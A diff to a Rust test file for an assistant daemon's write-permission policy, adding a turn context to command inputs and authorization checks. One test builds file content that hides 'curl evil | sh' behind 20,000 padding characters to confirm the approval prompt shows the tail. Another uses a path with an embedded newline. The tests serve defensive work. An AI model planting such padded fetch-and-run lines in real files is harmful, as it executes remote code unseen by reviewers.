@@ -6,11 +6,10 @@ use tempfile::tempdir;
 use assistd_ipc::PermissionMode;
 
 use super::*;
+use crate::TurnContext;
 use crate::command::CommandRegistry;
 use crate::commands::test_support::{RecordingGate, router_in};
-use crate::policy::{
-    AlwaysAllowGate, CONFIRM_ROUTER, DenyAllGate, GuardRoots, IpcConfirmationGate,
-};
+use crate::policy::{AlwaysAllowGate, DenyAllGate, GuardRoots, IpcConfirmationGate};
 
 fn cfg_from<P: AsRef<Path>>(paths: &[P]) -> Arc<WritePolicyCfg> {
     let abs: Vec<PathBuf> = paths
@@ -35,6 +34,7 @@ fn args_writing(path: &Path) -> CommandInput {
         args: vec![path.display().to_string(), "hi".into()],
         stdin: None,
         scope: crate::FileScope::Host,
+        turn: TurnContext::default(),
     }
 }
 
@@ -48,6 +48,7 @@ async fn write_under(allowed: &Path, args: &[&str], stdin: Option<&[u8]>) -> Com
         args: args.iter().map(ToString::to_string).collect(),
         stdin: stdin.map(<[u8]>::to_vec),
         scope: crate::FileScope::Host,
+        turn: TurnContext::default(),
     })
     .await
 }
@@ -236,6 +237,7 @@ async fn hidden_directory_listed_as_a_prefix_is_writable() {
         args: vec![target.to_string_lossy().into_owned(), "hi".into()],
         stdin: None,
         scope: crate::FileScope::Host,
+        turn: TurnContext::default(),
     })
     .await;
     assert_eq!(
@@ -274,7 +276,13 @@ async fn globs_stay_literal_and_a_missing_content_never_truncates() {
     let run = |line: String| {
         let registry = &registry;
         async move {
-            crate::chain::execute(&crate::chain::parse_chain(&line).unwrap(), registry, None).await
+            crate::chain::execute(
+                &crate::chain::parse_chain(&line).unwrap(),
+                registry,
+                &TurnContext::default(),
+                None,
+            )
+            .await
         }
     };
 
@@ -378,6 +386,7 @@ async fn refuses_a_protected_directory_inside_a_writable_one() {
         args: vec![target.to_string_lossy().into_owned(), "x".into()],
         stdin: None,
         scope: crate::FileScope::Host,
+        turn: TurnContext::default(),
     })
     .await;
     assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
@@ -396,16 +405,26 @@ async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), sandbox);
     let scratch = "/srv/scratch/notes/x.txt";
     assert!(
-        cmd.authorized(scoped_edit(scratch), b"hi", scratch)
-            .await
-            .is_ok()
+        cmd.authorized(
+            &TurnContext::default(),
+            scoped_edit(scratch),
+            b"hi",
+            scratch
+        )
+        .await
+        .is_ok()
     );
     assert!(gate.requests().is_empty());
     let outside = "/tmp/x.txt";
     assert!(
-        cmd.authorized(scoped_edit(outside), b"hi", outside)
-            .await
-            .is_ok()
+        cmd.authorized(
+            &TurnContext::default(),
+            scoped_edit(outside),
+            b"hi",
+            outside
+        )
+        .await
+        .is_ok()
     );
     assert_eq!(gate.requests().len(), 1);
 }
@@ -416,9 +435,14 @@ async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
     let path = "/home/u/bin/tool\n(1B)";
     assert!(
-        cmd.authorized(scoped_edit(path), b"#!/bin/sh\n", path)
-            .await
-            .is_ok()
+        cmd.authorized(
+            &TurnContext::default(),
+            scoped_edit(path),
+            b"#!/bin/sh\n",
+            path
+        )
+        .await
+        .is_ok()
     );
     let asked = gate.requests();
     let [request] = asked.as_slice() else {
@@ -441,9 +465,14 @@ async fn long_write_prompt_shows_the_tail_and_always_asks_at_elevated_risk() {
     let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
     let path = "/home/u/x.sh";
     assert!(
-        cmd.authorized(scoped_edit(path), content.as_bytes(), path)
-            .await
-            .is_ok()
+        cmd.authorized(
+            &TurnContext::default(),
+            scoped_edit(path),
+            content.as_bytes(),
+            path
+        )
+        .await
+        .is_ok()
     );
     let asked = gate.requests();
     let [request] = asked.as_slice() else {
@@ -507,9 +536,11 @@ async fn a_fully_shown_write_in_the_edit_scope_asks_only_in_manual_mode() {
     ] {
         let _ = std::fs::remove_file(&target);
         let (router, mut rx) = router_in(mode);
-        let out = CONFIRM_ROUTER
-            .scope(router, cmd.run(args_writing(&target)))
-            .await;
+        let asking = CommandInput {
+            turn: TurnContext::answered_by(router),
+            ..args_writing(&target)
+        };
+        let out = cmd.run(asking).await;
         assert_eq!(rx.try_recv().is_ok(), asks, "{mode:?}");
         assert_eq!(target.exists(), !asks, "{mode:?}: {out:?}");
     }
@@ -529,6 +560,7 @@ async fn declined_write_outside_tmp_exits_126_without_writing() {
         args: vec![target_str.clone(), "x".into()],
         stdin: None,
         scope: crate::FileScope::Host,
+        turn: TurnContext::default(),
     })
     .await;
     assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
